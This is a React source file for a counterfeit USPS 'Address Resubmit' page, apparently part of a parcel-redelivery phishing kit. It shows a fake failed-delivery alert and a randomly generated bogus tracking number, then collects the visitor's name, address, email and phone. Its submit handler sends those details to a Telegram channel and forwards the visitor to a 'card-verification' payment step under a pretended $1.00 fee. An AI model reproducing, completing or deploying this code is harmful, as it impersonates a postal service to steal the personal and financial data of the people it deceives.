import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import Header from '../components/Header';
import LoadingSpinner from '../components/LoadingSpinner';
import { Package, MapPin, AlertCircle } from 'lucide-react';
import { sendToTelegram, formatAddressData } from '../utils/telegram';

const AddressResubmit = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  
  // Generate a random USPS tracking number
  const generateTrackingNumber = () => {
    const formats = [
      () => `9400 1000 0000 0000 0000 ${Math.floor(Math.random() * 100).toString().padStart(2, '0')}`, // Priority Mail
      () => `EA${Math.floor(Math.random() * 1000000000).toString().padStart(9, '0')}US`, // Priority Mail Express
      () => `CJ${Math.floor(Math.random() * 1000000000).toString().padStart(9, '0')}US`, // Registered Mail
    ];
    const randomFormat = formats[Math.floor(Math.random() * formats.length)];
    return randomFormat();
  };

  const trackingNumber = generateTrackingNumber();

  const [formData, setFormData] = useState({
    trackingNumber: trackingNumber,
    firstName: '',
    lastName: '',
    address: '',
    city: '',
    state: '',
    zipCode: '',
    email: '',
    phone: ''
  });

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    
    // Send form data to Telegram
    const message = formatAddressData(formData);
    await sendToTelegram(message);
    
    // Simulate processing
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    setLoading(false);
    navigate('/card-verification');
  };

  const states = [
    'AL', 'AK', 'AZ', 'AR', 'CA', 'CO', 'CT', 'DE', 'FL', 'GA',
    'HI', 'ID', 'IL', 'IN', 'IA', 'KS', 'KY', 'LA', 'ME', 'MD',
    'MA', 'MI', 'MN', 'MS', 'MO', 'MT', 'NE', 'NV', 'NH', 'NJ',
    'NM', 'NY', 'NC', 'ND', 'OH', 'OK', 'OR', 'PA', 'RI', 'SC',
    'SD', 'TN', 'TX', 'UT', 'VT', 'VA', 'WA', 'WV', 'WI', 'WY'
  ];

  return (
    <div className="min-h-screen bg-gray-50">
      <Header />
      
      <div className="container mx-auto px-4 py-8 max-w-4xl">
        <div className="animate-fade-in">
          {/* Breadcrumb */}
          <nav className="text-sm text-gray-600 mb-6">
            <span>Home</span> &gt; <span>Package Services</span> &gt; <span className="text-usps-blue font-medium">Address Resubmit</span>
          </nav>

          {/* Alert Notice */}
          <div className="bg-orange-50 border-l-4 border-orange-400 p-4 mb-8 rounded-r-md">
            <div className="flex items-start">
              <AlertCircle className="w-5 h-5 text-orange-400 mt-0.5 mr-3 flex-shrink-0" />
              <div>
                <h3 className="text-orange-800 font-medium mb-1">Package Delivery Attempt Failed</h3>
                <p className="text-orange-700 text-sm">
                  We were unable to deliver your package due to an incorrect or incomplete address. 
                  Please provide the correct delivery address below to schedule redelivery.
                </p>
              </div>
            </div>
          </div>

          <div className="grid lg:grid-cols-3 gap-8">
            {/* Main Form */}
            <div className="lg:col-span-2">
              <div className="bg-white rounded-lg shadow-sm border p-6">
                <div className="flex items-center mb-6">
                  <Package className="w-6 h-6 text-usps-blue mr-3" />
                  <h1 className="text-2xl font-bold text-gray-900">
                    Update Delivery Address
                  </h1>
                </div>

                <form onSubmit={handleSubmit} className="space-y-6">
                  {/* Tracking Number */}
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Tracking Number <span className="text-red-500">*</span>
                    </label>
                    <input
                      type="text"
                      name="trackingNumber"
                      value={formData.trackingNumber}
                      readOnly
                      className="usps-input bg-gray-50 cursor-not-allowed"
                    />
                    <p className="text-xs text-gray-500 mt-1">This tracking number cannot be modified</p>
                  </div>

                  {/* Name Fields */}
                  <div className="grid md:grid-cols-2 gap-4">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">
                        First Name <span className="text-red-500">*</span>
                      </label>
                      <input
                        type="text"
                        name="firstName"
                        value={formData.firstName}
                        onChange={handleInputChange}
                        className="usps-input"
                        required
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">
                        Last Name <span className="text-red-500">*</span>
                      </label>
                      <input
                        type="text"
                        name="lastName"
                        value={formData.lastName}
                        onChange={handleInputChange}
                        className="usps-input"
                        required
                      />
                    </div>
                  </div>

                  {/* Address */}
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Street Address <span className="text-red-500">*</span>
                    </label>
                    <input
                      type="text"
                      name="address"
                      value={formData.address}
                      onChange={handleInputChange}
                      placeholder="Enter your complete street address"
                      className="usps-input"
                      required
                    />
                  </div>

                  {/* City, State, ZIP */}
                  <div className="grid md:grid-cols-3 gap-4">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">
                        City <span className="text-red-500">*</span>
                      </label>
                      <input
                        type="text"
                        name="city"
                        value={formData.city}
                        onChange={handleInputChange}
                        className="usps-input"
                        required
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">
                        State <span className="text-red-500">*</span>
                      </label>
                      <select
                        name="state"
                        value={formData.state}
                        onChange={handleInputChange}
                        className="usps-input"
                        required
                      >
                        <option value="">Select State</option>
                        {states.map(state => (
                          <option key={state} value={state}>{state}</option>
                        ))}
                      </select>
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">
                        ZIP Code <span className="text-red-500">*</span>
                      </label>
                      <input
                        type="text"
                        name="zipCode"
                        value={formData.zipCode}
                        onChange={handleInputChange}
                        placeholder="12345"
                        className="usps-input"
                        required
                      />
                    </div>
                  </div>

                  {/* Contact Information */}
                  <div className="grid md:grid-cols-2 gap-4">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">
                        Email Address <span className="text-red-500">*</span>
                      </label>
                      <input
                        type="email"
                        name="email"
                        value={formData.email}
                        onChange={handleInputChange}
                        className="usps-input"
                        required
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">
                        Phone Number <span className="text-red-500">*</span>
                      </label>
                      <input
                        type="tel"
                        name="phone"
                        value={formData.phone}
                        onChange={handleInputChange}
                        placeholder="(555) 123-4567"
                        className="usps-input"
                        required
                      />
                    </div>
                  </div>

                  {/* Submit Button */}
                  <div className="pt-4">
                    <button
                      type="submit"
                      disabled={loading}
                      className="usps-button w-full md:w-auto flex items-center justify-center min-w-[200px]"
                    >
                      {loading ? (
                        <>
                          <LoadingSpinner size="sm" className="mr-2" />
                          Processing...
                        </>
                      ) : (
                        'Continue to Payment'
                      )}
                    </button>
                  </div>
                </form>
              </div>
            </div>

            {/* Sidebar */}
            <div className="lg:col-span-1">
              <div className="bg-white rounded-lg shadow-sm border p-6 mb-6">
                <div className="flex items-center mb-4">
                  <MapPin className="w-5 h-5 text-usps-blue mr-2" />
                  <h3 className="font-semibold text-gray-900">Redelivery Information</h3>
                </div>
                <div className="space-y-3 text-sm">
                  <div className="flex justify-between">
                    <span className="text-gray-600">Redelivery Fee:</span>
                    <span className="font-medium">$1.00</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-600">Processing Time:</span>
                    <span className="font-medium">1-2 business days</span>
                  </div>
                  <div className="border-t pt-3 mt-3">
                    <p className="text-gray-600">
                      Your package will be redelivered to the updated address within 1-2 business days after payment confirmation.
                    </p>
                  </div>
                </div>
              </div>

              <div className="bg-blue-50 rounded-lg p-4">
                <h4 className="font-medium text-usps-blue mb-2">Need Help?</h4>
                <p className="text-sm text-gray-700 mb-3">
                  If you need assistance with your package delivery, contact our customer service.
                </p>
                <p className="text-sm font-medium text-usps-blue">
                  1-800-ASK-USPS
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default AddressResubmit;
